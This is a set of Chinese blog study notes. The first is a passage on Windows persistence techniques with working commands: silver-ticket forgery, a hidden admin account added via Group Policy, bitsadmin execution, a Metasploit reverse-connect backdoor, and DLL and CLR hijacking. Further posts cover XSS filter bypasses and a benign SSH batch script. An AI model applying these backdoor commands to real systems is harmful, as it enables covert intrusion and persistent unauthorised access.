<p>黄金票据伪造的TGT,那么白银票据伪造的是ST。在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,伪造的门票只对部分服务起作用。</p>
<p>白银票据常用服务：</p>
<table>
<thead>
<tr>
<th><strong>Service Type</strong></th>
<th><strong>Service Silver Tickets</strong></th>
</tr>
</thead>
<tbody><tr>
<td>WMI</td>
<td>HOST RPCSS</td>
</tr>
<tr>
<td>PowerShell Remoting</td>
<td>HOST HTTP</td>
</tr>
<tr>
<td>WinRM</td>
<td>HOST HTTP</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
</tr>
<tr>
<td>Windows File Share (CIFS)</td>
<td>CIFS</td>
</tr>
<tr>
<td>LDAP operations includingMimikatz DCSync</td>
<td>LDAP</td>
</tr>
<tr>
<td>Windows Remote Server Administration Tools</td>
<td>RPCSS LDAP CIFS</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">利用条件：1.目标服务器全域名2.域sid3.可利用的服务4.服务账号的ntlm <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>

<p><strong>演示-伪造CIFS权限：</strong></p>
<p>CIFS用于主机之间文件共享。</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">生成票据：kerberos::golden /domain:<span class="params">&lt;域名&gt;</span> /sid:<span class="params">&lt;域 SID&gt;</span> /target:<span class="params">&lt;目标服务器主机名&gt;</span> /service:<span class="params">&lt;服务类型&gt;</span> /rc4:<span class="params">&lt;NTLM Hash&gt;</span> /user:<span class="params">&lt;用户名&gt;</span> /ptt</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225149.webp" alt="图片"></p>
<p>此时就可以访问目标机器的共享目录了。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225150.webp" alt="图片"></p>
<h4 id="十一、组策略设置脚本启动"><a href="#十一、组策略设置脚本启动" class="headerlink" title="十一、组策略设置脚本启动"></a><strong>十一、组策略设置脚本启动</strong></h4><p>1.首先创建一个脚本，此处为添加隐藏用户，内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> offnet user <span class="built_in">test</span>$ Test123456. /addnet localgroup administrators <span class="built_in">test</span>$ /addexit</span><br></pre></td></tr></table></figure>

<p>2.打开组策略配置脚本（启动/关机），添加脚本，关机就会自动执行脚本。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225151.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225152.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225153.webp" alt="图片"></p>
<h4 id="十二、bitsadmin"><a href="#十二、bitsadmin" class="headerlink" title="十二、bitsadmin"></a><strong>十二、bitsadmin</strong></h4><p>BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">常用命令：bitsadmin <span class="regexp">/create [type] DisplayName /</span><span class="regexp">/创建一个任务bitsadmin /</span>cancel &lt;Job&gt; <span class="regexp">//</span>删除一个任务bitsadmin <span class="regexp">/list /</span>allusers <span class="regexp">/verbose /</span><span class="regexp">/列出所有任务bitsadmin /</span>AddFile &lt;Job&gt; &lt;RemoteURL&gt; &lt;LocalName&gt; <span class="regexp">//</span>给任务test添加一个下载文件bitsadmin <span class="regexp">/SetNotifyCmdLine &lt;Job&gt; &lt;ProgramName&gt; [ProgramParameters] /</span><span class="regexp">/设置在任务完成传输时或任务进入状态时将运行的命令行命令。bitsadmin /</span>Resume &lt;Job&gt; <span class="regexp">//</span>激活传输队列中的新任务或挂起的任务。bitsadmin <span class="regexp">/cancel &lt;Job&gt; /</span><span class="regexp">/删除某个任务bitsadmin /</span>reset <span class="regexp">/allusers /</span><span class="regexp">/删除所有任务bitsadmin /</span>complete &lt;Job&gt; <span class="regexp">//</span>完成某个任务</span><br></pre></td></tr></table></figure>

<p><strong>演示：</strong></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">bitsadmin /create test   //创建任务testbitsadmin /addfile test c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe c:<span class="symbol">\U</span>sers<span class="symbol">\n</span>dsec<span class="symbol">\D</span>esktop<span class="symbol">\c</span>alc.exebitsadmin /SetNotifyCmdLine test cmd.exe &quot;cmd.exe /c calc.exe&quot;bitsadmin /resume test</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225154.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225155.png" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225156.webp" alt="图片"></p>
<h4 id="十三、msf-persistence后门"><a href="#十三、msf-persistence后门" class="headerlink" title="十三、msf persistence后门"></a><strong>十三、msf persistence后门</strong></h4><p>使用persistence模块创建后门。</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">参数：-A 自动启动匹配的exploit<span class="meta-keyword">/multi/</span>handler 连接到代理-L <span class="params">&lt;opt&gt;</span> 目标主机中要写入有效负载的位置，如果没有，将使用 %TEMP%。-P <span class="params">&lt;opt&gt;</span> 要使用的有效负载，默认为 windows<span class="meta-keyword">/meterpreter/</span>reverse_tcp。-S 在启动时自动启动代理作为服务（具有 SYSTEM 权限）-T <span class="params">&lt;opt&gt;</span> 要使用的备用可执行模板-U 用户登录时自动启动代理-X 系统启动时自动启动代理-h 帮助菜单-i <span class="params">&lt;opt&gt;</span> 每次连接尝试之间的时间间隔（以秒为单位）-p <span class="params">&lt;opt&gt;</span> 运行 Metasploit 的系统正在监听的端口-r <span class="params">&lt;opt&gt;</span> 运行 Metasploit 的系统的 IP 监听连接</span><br></pre></td></tr></table></figure>

<p>执行如下命令，在目标机创建一个vbs后门，每5秒进行回连：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">run</span> persistence -S -U -X -i <span class="number">5</span> -p <span class="number">55555</span> -r <span class="number">192.168.1.128</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225157.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225158.webp" alt="图片"></p>
<p>监听55555端口，成功上线。</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225159.webp" alt="图片"></p>
<h4 id="十四、DLL劫持"><a href="#十四、DLL劫持" class="headerlink" title="十四、DLL劫持"></a><strong>十四、DLL劫持</strong></h4><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。</p>
<p><strong>dll加载顺序:</strong></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">Windows xp sp2之前：1. 进程对应的应用程序所在目录；2. 当前目录（Current Directory）；3. 系统目录（通过 GetSystemDirectory 获取）；4. 16位系统目录；5. Windows目录（通过 GetWindowsDirectory 获取）；6. PATH环境变量中的各个目录；</span><br><span class="line">Windows xp sp2之后：Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：默认注册表为：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ession Manager<span class="symbol">\S</span>afeDllSearchMode，其键值为11. 进程对应的应用程序所在目录（可理解为程序安装目录比如C:<span class="symbol">\P</span>rogramFiles<span class="symbol">\u</span>Torrent）2. 系统目录（即<span class="variable">%windir%</span>system32）；3. 16位系统目录（即<span class="variable">%windir%</span>system）；4. Windows目录（即<span class="variable">%windir%</span>）；5. 当前目录（运行的某个文件所在目录，比如C:<span class="symbol">\D</span>ocuments and Settings<span class="symbol">\A</span>dministrator<span class="symbol">\D</span>esktop<span class="symbol">\t</span>est）；6. PATH环境变量中的各个目录；</span><br><span class="line">win7以上版本：系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ession Manager<span class="symbol">\K</span>nownDLLs</span><br></pre></td></tr></table></figure>

<p><strong>演示-劫持极速pdf阅读器：</strong></p>
<p>1.使用process explorer分析可以劫持的dll文件，劫持sqlite3.dll</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225160.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225161.webp" alt="图片"></p>
<p>2.使用ahaeadlib将sqlite3.dll转为cpp文件</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225162.webp" alt="图片"></p>
<p>3.使用visual studio打开cpp文件插入要执行的后门代码，并生成新的dll文件</p>
<figure class="highlight monkey"><table><tr><td class="code"><pre><span class="line">STARTUPINFO si = &#123; sizeof(si) &#125;;PROCESS_INFORMATION <span class="built_in">pi</span>;CreateProcess(TEXT(<span class="string">&quot;C:\\666.exe&quot;</span>), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;<span class="built_in">pi</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225163.webp" alt="图片"></p>
<p>4.将新的dll文件改名为sqlite3.dll，将旧的sqlite3.dll改为sqlite3Org.dll</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226164.webp" alt="图片"></p>
<p>5.打开极速pdf阅读器后成功上线</p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226165.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226166.webp" alt="图片"></p>
<h4 id="十五、CLR劫持"><a href="#十五、CLR劫持" class="headerlink" title="十五、CLR劫持"></a><strong>十五、CLR劫持</strong></h4><p>CLR全称Common Language Runtime，中文名称为公共语言运行时。CLR是.NETFramework的主要执行引擎，作用之一是监视程序的运行。可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件。</p>
<p>1.修改注册表：HKEY_CURRENT_USER\Software\Classes\CLSID\</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="string">/VE</span> <span class="string">/T</span> REG_SZ <span class="string">/D</span> <span class="string">&quot;C:\test.dll&quot;</span> <span class="string">/FREG</span> ADD <span class="string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="string">/V</span> ThreadingModel <span class="string">/T</span> REG_SZ <span class="string">/D</span> Apartment <span class="string">/F</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226167.webp" alt="图片"></p>
<p>2.配置全局环境变量，不然只在当前cmd窗口劫持.net程序，然后直接执行powershell即可上线。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">SETX</span> COR_ENABLE_PROFILING <span class="number">1</span> /MSETX COR_PROFILER &#123;<span class="number">11111111</span>-<span class="number">1234</span>-<span class="number">1234</span>-<span class="number">1234</span>-<span class="number">111111111111</span>&#125; /M</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226168.webp" alt="图片"></p>
<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226169.webp" alt="图片"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Windows权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本攻击</title>
    <url>/2022/01/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="什么是XSS-XSS原理"><a href="#什么是XSS-XSS原理" class="headerlink" title="什么是XSS/XSS原理"></a>什么是XSS/XSS原理</h1><ul>
<li><p>攻击者嵌入恶意脚本代码到用户会访问到的页面中，用户访问该页面的时候，就引起恶意脚本代码的执行，从而达到恶意攻击用户的目的。攻击者可以使用户在浏览器中执行其预定义的恶意脚本，变量接受数据的时候，数据可以写成js脚本代码，进行回显操作</p>
</li>
<li><p>本质上属于前端漏洞，产生在浏览器和js代码中的漏洞</p>
<span id="more"></span></li>
</ul>
<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><ul>
<li><p>反射型XSS(非持续型XSS)</p>
</li>
<li><p>储存型XSS(持续型XSS）</p>
</li>
<li><p>DOM XSS</p>
</li>
</ul>
<h1 id="具体区别"><a href="#具体区别" class="headerlink" title="具体区别"></a>具体区别</h1><ul>
<li><p>反射型：数据提交过去时，会在代码执行之后直接反馈回来发包x=zzx=&gt;x.php=&gt;回包</p>
</li>
<li><p>存储型：数据提交过去时，会在代码执行之后储存到数据库的某个表里，然后反馈回来发包x=zzx=&gt;x.php=&gt;写到数据库某个表=&gt;x.php&gt;回显</p>
</li>
<li><p>DOM型：发包x=zzx=&gt;本地浏览器静态前端代码=&gt;x.php</p>
</li>
<li><p>反射型和储存型属于后端语言进行数据处理，而DOM型是用js代码进行处理 </p>
</li>
</ul>
<h1 id="三者原理"><a href="#三者原理" class="headerlink" title="三者原理"></a>三者原理</h1><ul>
<li><p>反射型XSS：应用或API没有对用户输入数据进行验证或没进行转义然后作为HTML的输出的一部分，能够使得攻击者在受害者的浏览器上执行任意HTML和JavaScript。</p>
</li>
<li><p>存储型XSS：应用或API存储未格式化的用户输入，且该输入之后会被其他用户或管理员浏览到。</p>
</li>
<li><p>DOM XSS：动态包含攻击者可控制数据到页面中的JavaScript框架， 单页应用，API易受DOM XSS。</p>
</li>
<li><p>涉及函数类：常见的输出类函数</p>
</li>
</ul>
<h1 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h1><ul>
<li><p>方法一： 查看代码，查找关键的变量,   客户端将数据传送给Web 服务端一般通过三种方式 Querystring, Form表单，以及cookie.  例如在ASP的程序中，通过Request对象获取客户端的变量。 假如变量没有经过htmlEncode处理， 那么这个变量就存在一个XSS漏洞</p>
</li>
<li><p>方法二：xss跨站漏洞测试语句， 在网页中的Textbox或者其他能输入数据的地方，输入测试语句， 看能不能弹出对话框，能弹出的话说明存在XSS漏洞， 在URL中查看有那些变量通过URL把值传给Web服务器， 把这些变量的值退换成测试语句。  然后看是否能执行</p>
</li>
<li><p>方法三:  自动化测试XSS漏洞</p>
</li>
</ul>
<h1 id="可能存在XSS漏洞点"><a href="#可能存在XSS漏洞点" class="headerlink" title="可能存在XSS漏洞点"></a>可能存在XSS漏洞点</h1><ul>
<li>用户能够输入提交数据的地方，文本框，url，请求头等等</li>
</ul>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ul>
<li><p>如劫持用户会话，插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖XSS蠕虫，甚至破坏网站、修改路由器配置信息等。</p>
</li>
<li><p>XSS实质上就是JS脚本，任何JS脚本能实现的功能，XSS也能实现能做到的Cookie劫持、构造GET和POST请求、XSS钓鱼、识别用户浏览器、识别用户安装的软件等</p>
</li>
</ul>
<h1 id="防范修复"><a href="#防范修复" class="headerlink" title="防范修复"></a>防范修复</h1><ul>
<li><p>前端采用大型框架Angular,Vue,React等等。</p>
</li>
<li><p>用session代替cookie。</p>
</li>
<li><p>对于用户输入的数据要严格过滤写入数据库的数据，一定要保证合理过滤。</p>
</li>
<li><p>对于所有输出的地方，一定要做好过滤工作，比如采用模版渲染等等。</p>
</li>
<li><p>使用Token</p>
</li>
<li><p>使用HttpOnly</p>
</li>
</ul>
<h1 id="什么是HttpOnly？"><a href="#什么是HttpOnly？" class="headerlink" title="什么是HttpOnly？"></a>什么是HttpOnly？</h1><ul>
<li>如果在cookie中设置了HTTPonly属性，那么通过js脚本将无法读取到cookie信息，这样能有效防止XSS攻击。</li>
</ul>
<h1 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h1><ul>
<li><p>浏览器未保存账号密码：需要XSS产生登录地址，利用表单劫持</p>
</li>
<li><p>浏览器保存了账号密码：产生后台的XSS，储存型XSS，如留言等，利用浏览器读取账号密码</p>
</li>
</ul>
<h1 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h1><ul>
<li><p>修改编码格式</p>
</li>
<li><p>加密解密算法</p>
</li>
<li><p>结合其他漏洞绕过</p>
</li>
<li><p>大小写onerror函数</p>
</li>
<li><p>配合平台，例如<a href="http://xssfuzzer.com/">xssfuzzer.com</a>生成语句</p>
</li>
<li><p>工具：Xwaf,XSStrike</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python&amp;&amp;shell--批量跑主机脚本</title>
    <url>/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>上周去现场，大佬说年前要跑主机脚本，就是服务器有点多，问有没有办法一键下发，然后执行脚本去跑，跑完之后回收数据，我听这需求，这不是有手就行？然后就应了下来，说我试试，我本以为就是简单的写个py脚本的事情，确认好需求之后就直接开整，刚开始我写的是使用ssh服务去批量搞。</p>
<span id="more"></span>

<h1 id="二、python实现"><a href="#二、python实现" class="headerlink" title="二、python实现"></a>二、python实现</h1><p>先确定下流程，大概的流程就是这四个：</p>
<ol>
<li>连接服务器</li>
<li>上传脚本</li>
<li>执行脚本</li>
<li>回收数据</li>
</ol>
<p>最重要的是先连接上去，不然想得再好都没用，连接的话我用是py的paramiko，功能挺强大的，Paramiko是用py写的一个模块，远程连接到Linux服务器，查看上面的日志状态，批量配置远程服务器，文件上传，文件下载等都可以，除此之外我还用到了pandas，毕竟要批量的话，要去读取表格数据，从表格里面去获取每一台主机的信息，而在paramiko的连接这块有几个坑，首先是连接上去，连接上去有很多种方式，首先分为两大类，一类是SSH，一类是FTP，然后每一类都有两种连接方式，一种是基于密码，一种是基于密钥。先说下SSH连接上去的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">ssh.connect(<span class="string">&quot;IP&quot;</span>,<span class="number">22</span>,<span class="string">&quot;user&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这个的话是没办法上传下载文件的，如果我们要上传文件上去，并且回收数据的话，用这种是没办法实现的，当然也可能是我太菜了，如果有大铁子能实现，麻烦带带小弟。所以这边我使用的是Transport，这种方式连接上去之后能够实现很多功能，可以说是一个小型的putty了。</p>
<p>关键代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#获取表格数据</span></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;server_information.xlsx&#x27;</span>)</span><br><span class="line">data=df.values</span><br><span class="line"><span class="comment">#获取单列长度，之后可以作为循环次数的依据</span></span><br><span class="line">L = <span class="built_in">len</span>(df)</span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#这里做了个分割，是因为下面这块我把for去掉了，上面的表格是需要循环的时候用的，下面针对单个服务器进行说明</span></span><br><span class="line">IP = data[i][<span class="number">0</span>]</span><br><span class="line">port = data[i][<span class="number">1</span>]</span><br><span class="line">name=data[i][<span class="number">2</span>]</span><br><span class="line">password=data[i][<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 实例化一个transport对象</span></span><br><span class="line">trans = paramiko.Transport((IP, port))</span><br><span class="line"><span class="comment"># 建立连接</span></span><br><span class="line">trans.connect(username=name, password=password)</span><br><span class="line"><span class="comment"># 将sshclient的对象的transport指定为以上的trans</span></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh._transport = trans</span><br><span class="line">sftp = paramiko.SFTPClient.from_transport(trans)</span><br><span class="line"><span class="comment">#下面是执行了获取IP的命令，因为回收的数据命名格式有根据本机IP来，所以这里先获取下IP</span></span><br><span class="line"><span class="comment"># stdout 为正确输出，stderr为错误输出，同时是有1个变量有值</span></span><br><span class="line">stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;ip a|grep inet|grep brd&#x27;</span>)</span><br><span class="line"><span class="comment"># inet 10.0.20.12/22 brd 10.0.23.255 scope global eth0</span></span><br><span class="line"><span class="comment"># 打印执行结果</span></span><br><span class="line">i_IP = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">Intranet_IP_str= i_IP.split()</span><br><span class="line">Intranet_IP = Intranet_IP_str[<span class="number">1</span>].split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="comment"># 10.0.20.12 22</span></span><br></pre></td></tr></table></figure>

<p>这两种连接方式我用的都是账号密码连接登录，用密钥的话也可以，具体的可以去百度下用法，其实都差不多。连接上去之后，你以为就搞定了，确实是能上传下载文件的，但是还是有坑，这里离谱的一点就是，连接上去之后你没办法去到别的文件夹下面，也就是说，你始终在根目录下面。</p>
<p><img src="https://ax-x.github.io/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/image-20220109152332407-16417130136852.png" alt="image-20220109152332407"></p>
<p>后面我去找了好久，看了下exec_command的说明才知道，原来每次执行完之后，他都会跳回到原目录下面，也就是说，虽然你执行了cd命令，但是他cd过去之后由于这个函数的原因，他会自己回到原来的目录下面，这就难搞了，我怎么去到我想要的那个文件夹下面去执行文件啊，本来试了下，根据路径去执行文件，但是试了几次发现不行，它只支持执行本目录的文件。</p>
<p>找了一段时间之后，发现可以cd到别的文件夹下面，但是需要去写别的东西，然后为了偷懒，我开始尝试一次执行多条命令，毕竟两条命令搞不定，我就一条命令完成，但是拼接也不是我们用的那种&amp;&amp;了，这个函数有个独特的地方就是，它自带了一个执行多条命令的功能，在一条命令后面使用“;”就可以把命令隔开，看成是两条命令了，例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;cd tmp;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/image-20220109152452438-16417130933893.png" alt="image-20220109152452438"></p>
<p>它就会先cd到tmp这个目录下面，然后执行ls命令，到这无法上传下载文件，无法跳转目录两个坑基本上就填上了，这里贴下完整的数据，表格的格式是IP，端口，用户名，密码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;server_information.xlsx&#x27;</span>)</span><br><span class="line">data=df.values</span><br><span class="line">L = <span class="built_in">len</span>(df)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;检测到当前主机数：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,L):</span><br><span class="line">    IP = data[i][<span class="number">0</span>]</span><br><span class="line">    port = data[i][<span class="number">1</span>]</span><br><span class="line">    name=data[i][<span class="number">2</span>]</span><br><span class="line">    password=data[i][<span class="number">3</span>]</span><br><span class="line">    <span class="comment"># 实例化一个transport对象</span></span><br><span class="line">    trans = paramiko.Transport((IP, port))</span><br><span class="line">    <span class="comment"># 建立连接</span></span><br><span class="line">    trans.connect(username=name, password=password)</span><br><span class="line">    <span class="comment"># 将sshclient的对象的transport指定为以上的trans</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh._transport = trans</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(trans)</span><br><span class="line">    stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;ip a|grep inet|grep brd&#x27;</span>)</span><br><span class="line">    <span class="comment"># inet 10.0.20.12/22 brd 10.0.23.255 scope global eth0</span></span><br><span class="line">    i_IP = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    Intranet_IP_str= i_IP.split()</span><br><span class="line">    Intranet_IP = Intranet_IP_str[<span class="number">1</span>].split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="comment"># 10.0.20.12 22</span></span><br><span class="line">    <span class="comment">#localpath—本地文件地址，remotepath——服务器存放地址</span></span><br><span class="line">    sftp.put(localpath=<span class="string">&#x27;/home/a.sh&#x27;</span>,</span><br><span class="line">             remotepath=<span class="string">&#x27;/tmp/a.sh&#x27;</span>)</span><br><span class="line">    stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;cd tmp;./a.sh&#x27;</span>)</span><br><span class="line">    Host_information = stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    sftp.get(localpath=Intranet_IP[<span class="number">0</span>]+<span class="string">&#x27;.xml&#x27;</span>,</span><br><span class="line">             remotepath=<span class="string">&#x27;/tmp/&#x27;</span>+Intranet_IP[<span class="number">0</span>]+<span class="string">&#x27;.xml&#x27;</span>)</span><br><span class="line">    <span class="comment">#sftp.get—下载文件，sftp.put—上传文件</span></span><br><span class="line">    <span class="built_in">print</span>(IP+<span class="string">&quot;:已完成&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://ax-x.github.io/2022/01/21/python-shell-%E6%89%B9%E9%87%8F%E8%B7%91%E4%B8%BB%E6%9C%BA%E8%84%9A%E6%9C%AC/image-20220115172343072-164223862468715.png" alt="image-20220115172343072"></p>
<p>当我开开心心提交过去给客户的时候，不出意外要有意外了，客户说想要shell脚本，啊这，也行！shell而已，这回先把客户那边开放的端口，服务啥的给问清楚，具体需要我做到什么，先了解清楚了先，然后一番讨价还价下来，客户说他那边有个平台能批量上传和运行文件了，叫我实现下回收就行了，那这还不好办。</p>
